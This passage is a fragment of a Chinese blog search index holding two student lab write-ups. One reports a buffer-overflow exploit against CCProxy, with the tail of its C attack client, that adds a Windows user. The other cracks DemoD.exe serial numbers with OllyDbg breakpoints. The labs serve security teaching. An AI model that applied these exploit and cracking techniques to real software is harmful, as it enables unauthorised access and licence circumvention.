class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//连接到服务器</span></span><br><span class="line">    ret = connect(sc, (<span class="keyword">const</span> sockaddr*)&amp;sa, <span class="keyword">sizeof</span>(sa));</span><br><span class="line">    recv(sc, buf1, <span class="number">1024</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//接收服务器端的回答</span></span><br><span class="line">    ret = send(sc, buf, <span class="number">2000</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="comment">//发送攻击数据</span></span><br><span class="line">    closesocket(sc);</span><br><span class="line">    WSACleanup();</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>然后运行CCproxy，再次执行上面的代码会发现CCProxy发生了溢出崩溃，理论上来说，代码成功执行会在系统中添加一个名为a的用户，在CMD窗口下利用net user指令查看用户状况可以发现已经成功添加，shellcode正确执行。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626220545.png" alt="用户添加成功"  /></p>
+<p>至此，利用简单的溢出漏洞来实现添加用户的功能已经完成。</p>
+<hr>
+<p><strong>$ps:$这是软件安全第二次实验的内容，最近的病毒实验实在太烧脑，希望后续能将这一部分完整记录下来！</strong></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/05AE3B62.gif" alt="img"></p>
+]]></content>
+      <categories>
+        <category>网络攻防</category>
+      </categories>
+      <tags>
+        <tag>网络攻防</tag>
+        <tag>软件安全</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Win32漏洞---破解DemoD.exe序列号</title>
+    <url>/2021/06/26/Win32%E6%BC%8F%E6%B4%9E-%E7%A0%B4%E8%A7%A3DemoD-exe%E5%BA%8F%E5%88%97%E5%8F%B7/</url>
+    <content><![CDATA[<hr>
+<p><strong>$ps:$软件安全第一次实验内容，简单破解序列号(最后只破解了部分)</strong></p>
+<hr>
+<h1 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h1><p><strong>操作系统：Microsoft windows XP SP3</strong></p>
+<p><strong>目标软件：DemoD.exe</strong></p>
+<p><strong>分析工具：LordPE, OllyDbg，Visual C++ 6.0</strong></p>
+<h1 id="实验过程记录"><a href="#实验过程记录" class="headerlink" title="实验过程记录"></a>实验过程记录</h1><p>首先用OllyDbg打开测试程序，这里对DemoD_简版.exe程序进行分析，对序列码的破解首先由于提示错误以窗口形式出现，所以这里对所有的MessageBox设置API断点，运行程序输入序列码测试发现程序在提示错误的地方发生中断。如下图中所示。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222710.png" alt="找到序列码匹配段的地址"></p>
+<p>接下来在代码区右键选择中文搜索引擎，点击智能搜索，会在搜索结果中发现部分提示信息，双击提示信息即可进入该段代码，搜索结果如图所示。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222802.png" alt="利用中文搜索字符串"></p>
+<p>双击上图中的“恭喜你！序列号第1部分正确！”进入序列号匹配段，进入后会发现在提示信息之前有一段“cmp eax,ecx”的代码，随后便出现“jnz DemoD_简.0040400C”的跳转指令，猜测cmp的指令为比较输入序列号和正确序列号的值，而跳转指令为输出错误信息的窗口。在比较指令之前设置断点，运行程序，设置第一段序列号为1234，请求验证序列号。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222845.png" alt="设置断点"></p>
+<p>运行程序后，发现程序在上述断点处中断，接下来单步执行到比较指令处，由于设置的第一部分序列号为1234，这时观察右侧的寄存器值会发现EAX=00001234，ECX=0000AC70，可以判定EAX为自己所输入的值，而ECX即AC70即为第一段序列号的正确值。接下来，删除该处的断点，将断点设置在第二部分比较指令之前，再次运行，将已知地正确序列号输入，并将即将判断的序列号设置为1234，以此循环往复便可以得到第二部分和第三部分正确序列号的值。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222918.png" alt="第一部分比较"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626222944.png" alt="第一部分验证"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223004.png" alt="第二部分比较"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223027.png" alt="第二部分正确"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223052.png" alt="第三部分比较"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223114.png" alt="第三部分正确"></p>
+<hr>
+<p>第四部分的判断逻辑较为复杂，且只在极少情况下会验证通过，这里只描述第四部分序列码的判断逻辑。观察这一部分的比较前的代码可知，对EAX和ECX的值进行比较，而EAX为ss:[ebp-0x158]处的值，假设我们输入的序列号为A-B-C-D，观察堆栈区地数值可以发现，ECX为A+B+C的值然后右移四位所得。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223205.png" alt="分析逻辑1"></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223222.png" alt="分析逻辑2"></p>
+<p>由上图可知，EBP-128、EBP-12C和EBP-130处存储的值为上述的ABC，而接下来的便是我们输入的完整的序列码。这里我们继续探究EAX的值即EBP-158处的值，往上查找代码会发现：首先查阅堆栈段发现[EBP-0x138]为A的值，而[EBP-0x144]为D的值，首先将二者相加赋予ECX，再将ECX与0xAFDA进行与操作后得到新的ECX，将ECX的值赋予[EBP-148]后赋给DX，最后将DX赋给[EBP-0x158]，最后得到EAX的值再与ECX进行比较进行判断。</p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223249.png" alt="分析逻辑4"></p>
+<p><strong><em><u>关于第四部分序列号的比较逻辑：</u></em></strong></p>
+<p><img src="https://gitee.com/Zhao-zhao2001/images/raw/master/img/20210626223622.png" alt="第四部分序列号"></p>
+<hr>
+<h1 id="实验问题"><a href="#实验问题" class="headerlink" title="实验问题"></a>实验问题</h1><p>首先便是对<strong><u><em>断点的设置问题</em></u></strong>，利用常规思维便是在某处将输入的序列码与正确的序列码进行比较，而正确的序列码与输入待验证的序列码都存放在寄存器中，通过识别自己输入的序列码便可以获得正确的序列码从而进行下一部分的验证。实验过程中在设置断点时，利用中文搜索引擎获得当序列号输入正确时中文提示的语句所在位置，往上遍历便能得到“CMP”指令进行比较所在位置。这里对于前三部分的断点设置经历尝试后，设置于比较指令之前然后断点停下后再单步运行至该指令即可。</p>
+<p>第二个问题便是<strong><em><u>正确序列码的变化问题</u></em></strong>，实验过程中发现，当实验时间超过一定时间后再次运行时，发现之前尝试获得的正确序列码已经发生了变化，重新进行实验验证便会发现已经生成了全新的正确的序列码等待验证。这在实验过程中造成了很大的困扰，多次尝试后才发现了这个问题。如上面实验过程中验证的前三部分正确的序列码为“AC70-BC32-E911”，而下图为另外一次尝试过程中的前三部分序列码验证正确时的场景，此时序列码为“D100-BC32-C386”。经过验证发现大概每1个小时左右序列码便会更新一次。</p>
+<p>第三个问题便是<strong><em><u>最后一段序列码的验证问题</u></em></strong>，我仍旧天真的以为第四段序列码的验证方式与前三段的验证方式是相同的，当尝试多次失败后回过头去分析代码才发现程序将输入的前三段序列码进行了一定程度的数学运算后才会进行比较，也就是说第四段序列码并不是单纯的独立序列码，而是与前三段序列码都相关，（具体的运算分析可以参考上述实验一实验过程记录中的分析过程）。此外，在该部分序列码的运算过程中涉及了一个与“0xAFDA”的按位与操作，该操作之后产生的结果与正确的结果比较时会发生较大的误差，由于产生的与“0xAFDA”进行按位与操作的序列码与该时间内产生的序列码前三部分都相关，因此对前三部分序列码的要求较为严格，经过大致的分析，在同一时间内要求产生正确的可行的序列码的概率约为1/8，综合上面讲到的一个小时更换一次序列码来说，时间成本是极高的，因此这里在实验过程中只对第四部分的序列码的产生过程进行了简述。</p>
+<hr>
+<p>$OK,Let’s\ go!$</p>
+]]></content>
+      <categories>
+        <category>网络攻防</category>
+      </categories>
+      <tags>
+        <tag>网络攻防</tag>
+        <tag>软件安全</tag>
       </tags>
   </entry>
 </search>
